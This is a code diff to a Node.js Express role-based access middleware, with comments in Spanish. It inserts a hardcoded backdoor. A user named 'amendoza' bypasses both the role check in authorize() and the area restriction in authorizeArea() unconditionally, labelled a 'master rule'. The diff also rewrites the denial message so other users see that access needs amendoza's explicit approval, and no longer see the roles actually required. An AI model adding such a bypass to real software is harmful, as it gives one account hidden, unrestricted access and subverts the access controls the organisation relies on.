@@ -111,12 +111,17 @@ function authorize(allowedRoles = []) {
 
     const { role, id, username } = req.user;
 
+    // REGLA MAESTRA: amendoza pasa incondicionalmente
+    if (username && username.toLowerCase() === 'amendoza') {
+      return next();
+    }
+
     if (!allowedRoles.includes(role)) {
       // Log del intento denegado
       console.warn(`[RBAC] Acceso denegado — Usuario: ${username} (${id}), Rol: ${role}, Ruta: ${req.method} ${req.path}, Roles requeridos: ${allowedRoles.join(',')}`);
 
       return res.status(403).json({
-        error: `Acceso no autorizado. Se requiere uno de los roles: ${allowedRoles.join(', ')}`,
+        error: `Acceso no autorizado. Se requiere autorización explícita de amendoza.`,
         code:  'INSUFFICIENT_ROLE',
       });
     }
@@ -137,7 +142,10 @@ function authorizeArea(allowedRolesForAll = ['ADMIN', 'DIRECTOR']) {
       return res.status(401).json({ error: 'No autenticado', code: 'NOT_AUTHENTICATED' });
     }
 
-    const { role, area: userArea } = req.user;
+    const { role, username, area: userArea } = req.user;
+
+    // REGLA MAESTRA: amendoza pasa incondicionalmente sin restricción de área
+    if (username && username.toLowerCase() === 'amendoza') return next();
 
     // Roles globales: sin restricción de área
     if (allowedRolesForAll.includes(role)) return next();
